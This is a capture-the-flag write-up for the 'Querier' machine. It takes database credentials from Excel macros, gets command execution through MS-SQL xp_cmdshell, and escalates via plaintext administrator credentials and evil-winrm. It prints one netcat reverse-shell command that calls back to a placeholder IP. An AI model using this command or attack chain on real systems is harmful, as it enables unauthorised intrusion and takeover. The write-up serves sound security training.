# Querier

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (2) (4) (2).png" alt=""><figcaption></figcaption></figure>

Interesting that there was a MS-SQL instance publicly open.

### XLSM Credentials

SMB allowed for null credentials to be accessed here:

<figure><img src="../../../.gitbook/assets/image (24) (2) (2).png" alt=""><figcaption></figcaption></figure>

Within the Reports directory, I found a .xlsm file.

<figure><img src="../../../.gitbook/assets/image (26) (7) (1).png" alt=""><figcaption></figcaption></figure>

We can download this Excel file back to our machine for analysis. Here, I used `oletools` to find out more about the file:

<figure><img src="../../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

We can see how there are VBA Macros within this file. Again, we can use `olevba` to extract the code.

<figure><img src="../../../.gitbook/assets/image (15) (1) (6).png" alt=""><figcaption></figcaption></figure>

We found find this set of credentials for the database here.

<figure><img src="../../../.gitbook/assets/image (11) (1) (4).png" alt=""><figcaption></figcaption></figure>

We can then use `mssqlclient.py` to authenticate as this `reporting` user for the database that is publicly facing forward.

<figure><img src="../../../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

### xp\_cmdshell

With access to the MS-SQL Database, I found that we are able to use `xp_cmdshell` to execute commands on the server.

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

With this, we can easily gain a reverse shell through whatever means. I executed `nc.exe` over SMB.

```
xp_cmdshell "\\<IP>\share\nc64.exe -e cmd <IP> 4444"
```

<figure><img src="../../../.gitbook/assets/image (27) (7).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Now that we're in the machine, I ran winPEAS to enumerate possible escalation vectors. Funnily, it found the Administrator credentials in plaintext within the machine.

<figure><img src="../../../.gitbook/assets/image (7) (4) (3).png" alt=""><figcaption></figcaption></figure>

Earlier, Nmap detected that port 5985 for WinRM was open. As such, we can use `evil-winrm` to gain a shell as the administrator.

<figure><img src="../../../.gitbook/assets/image (44) (4).png" alt=""><figcaption></figcaption></figure>
